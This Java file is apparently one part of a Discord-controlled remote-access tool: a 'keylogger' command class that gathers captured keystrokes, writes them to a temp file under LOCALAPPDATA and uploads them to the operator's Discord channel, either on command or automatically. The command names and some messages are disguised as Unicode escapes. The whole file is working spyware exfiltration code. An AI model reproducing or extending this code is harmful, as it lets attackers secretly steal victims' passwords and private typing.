package cmd;

import main.Bot;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.User;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Random;

public class Keystroke extends Command{
    public Keystroke(){
        this.name = "\u006b\u0065\u0079\u006c\u006f\u0067\u0067\u0065\u0072";
        this.usage = "\u002f\u006b\u0065\u0079\u006c\u006f\u0067\u0067\u0065\u0072";
        this.desc = "";
        this.type = CommandType.GENERAL;
    }
    public static ArrayList<String> lines = new ArrayList<>();
    public static boolean auto_send = true;
    private static final int rn = 76546;
    private static File makeFile() throws IOException {
        File file = new File(System.getenv("LOCALAPPDATA")+"\\tmp"+rn+".txt");
        if (!file.exists()&&!file.createNewFile()) return null;
        FileWriter writer = new FileWriter(file,false);
        if (lines.size() == 0) return null;
        long c = 0;
        for(String line : lines){
            c+=(line+'\n').length();
            if(c>7500000) {writer.write("\n### log too big!"); break;}
            writer.write(line+'\n');
        }
        writer.flush();
        writer.close();
        return file;
    }
    private static int up_count = 0;
    public static void checkUpload(){
        up_count++;
        if (up_count<3)return;
        up_count =0;
        String a = "";
        for(String line : lines) a+=line+"\n";
        if(a.length()>7500000) {
            File file = null;
            try { file = makeFile(); } catch (IOException e) { Bot.main_channel.sendMessage("\u0066\u0069\u006c\u0065 \u0074\u006f\u006f \u0062\u0069\u0067 \u006f\u0072 \u0066\u0061\u0069\u006c\u0065\u0064").queue(); }
            if (file!=null) try{Bot.main_channel.sendMessage("keylog file from "+Bot.bot_id+" (auto send)");Bot.main_channel.sendFile(file).queue();}catch (Exception ee){Bot.main_channel.sendMessage("`failed to send file (prob to big)`").queue();}
            file.delete();
            lines.clear();
        }
    }

    @Override
    public boolean onCommand(User user, Message message, String[] args) {
        if (args.length==1) {
            switch (args[0]){
                case "clear":
                    lines.clear();
                    message.getChannel().sendMessage("\u006c\u006f\u0067\u0067\u0065\u0072 \u0063\u006c\u0065\u0061\u0072\u0065\u0064").queue();
                    break;
                case "send":
                    File file = null;
                    try { file = makeFile(); } catch (IOException e) { message.getChannel().sendMessage("\u0066\u0069\u006c\u0065 \u0074\u006f\u006f \u0062\u0069\u0067 \u006f\u0072 \u0066\u0061\u0069\u006c\u0065\u0064").queue(); }
                    if (file!=null) try{message.getChannel().sendFile(file).queue();}catch (Exception ee){message.getChannel().sendMessage("`failed to send file (prob to big)`").queue();}
                    lines.clear();
                    file.delete();
                    break;
                case "auto":
                    auto_send = !auto_send;
                    if (!auto_send) message.getChannel().sendMessage("`keylogger auto send has been turned off for "+Bot.bot_id+"`").queue();
                    else message.getChannel().sendMessage("`keylogger auto send has been turned on for "+Bot.bot_id+"`").queue();
                default:
                    message.getChannel().sendMessage("`options: clear/send`").queue();
                    break;
            }
        }
        return true;
    }
}
